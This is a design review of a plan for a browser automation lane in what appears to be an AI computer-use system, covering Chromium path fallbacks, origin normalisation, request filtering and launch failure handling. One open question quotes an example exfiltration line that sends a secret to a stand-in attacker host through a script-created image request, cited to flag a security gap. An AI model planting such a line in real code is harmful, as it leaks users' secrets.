# Implementation Plan Review: Computer-Use Slice 1 — Browser Lane (2026-08-30)

This document collects feedback, suggestions, and open questions on the [Computer-Use Slice 1 — Browser Lane Implementation Plan](./2026-08-30-computer-use-slice-1-browser.md).

## Open Questions & Clarifications

### 1. Zero-Config Browser Path Resolution

* **Context:** In **Task 9**, `resolveChromiumPath` reads `process.env["NIMBUS_CHROMIUM_PATH"]` and otherwise returns `null`.
* **Question:** If the user has Chrome/Chromium installed in a standard location but has not set the env var, will the lane refuse to open by default? Since zero-config onboarding is a project goal, requiring manual env var configuration is a friction point.
* **Suggestion:** We should specify common system fallbacks for each OS (e.g. standard program files directory on Windows, `/Applications` on macOS, and `/usr/bin/google-chrome` or `/usr/bin/chromium` on Linux) inside `resolveChromiumPath()` so the system works out-of-the-box for standard installations.

### 2. Normalization of Target Origins

* **Context:** In **Task 4**, `CuBrowserTarget` copies arrays. In **Task 6**, `decideRequest` compares origins using `.includes(origin)`.
* **Question:** What happens if the user/caller supplies target origins with trailing slashes, path suffixes, or mixed casing (e.g., `https://Example.com/` vs `https://example.com`)? Mismatches during exact `.includes` checks could lead to unintended navigation blocks or bypasses.
* **Suggestion:** Normalise all input target origins in the `CuSession` constructor (or when the envelope is approved) using `new URL(o).origin` to ensure casing, ports, and trailing slashes are strictly uniform.

### 3. Exfiltration via Dynamic Media/Image Elements

* **Context:** In **Task 6**, dynamic requests of type `image`, `stylesheet`, etc., are marked as `PASSIVE` and unconditionally allowed (though logged).
* **Question:** If a page script dynamically creates an image tag to exfiltrate data (e.g., `new Image().src = "https://evil.com/leak?data=" + secret`), it bypasses the script-origin block because Playwright reports the resource type as `image`. Is this accepted?
* **Suggestion:** Add a specific warning comment to `decideRequest` and the design docs clarifying that the passive exemption means script-created DOM image/media elements can still exfiltrate data to arbitrary origins, but will be recorded under the `browser` egress class.

### 4. Playwright Launch Fail-Closed Handling

* **Context:** In **Task 10**, `openSession` initiates the session envelope and launches the lane.
* **Question:** If Playwright fails to launch the browser (e.g., system out of memory, profile directory locked, or invalid path), how is the failure handled?
* **Suggestion:** Ensure the launch is wrapped in a `try/catch` block. On failure, the session must be marked closed, `failed_after_approval` logged to the `audit_log` with the launch error summary, and any partially created resources cleaned up immediately.

## Suggested Improvements

### 1. Define Common OS Fallback Executable Paths

Add the following lookup list in `resolveChromiumPath()`:

* **Windows:**
  * `C:\Program Files\Google\Chrome\Application\chrome.exe`
  * `C:\Program Files (x86)\Google\Chrome\Application\chrome.exe`
  * `C:\Program Files\Google\Chrome SxS\Application\chrome.exe` (Canary)
* **macOS:**
  * `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome`
  * `/Applications/Chromium.app/Contents/MacOS/Chromium`
* **Linux:**
  * `/usr/bin/google-chrome`
  * `/usr/bin/chromium`
  * `/usr/bin/chromium-browser`
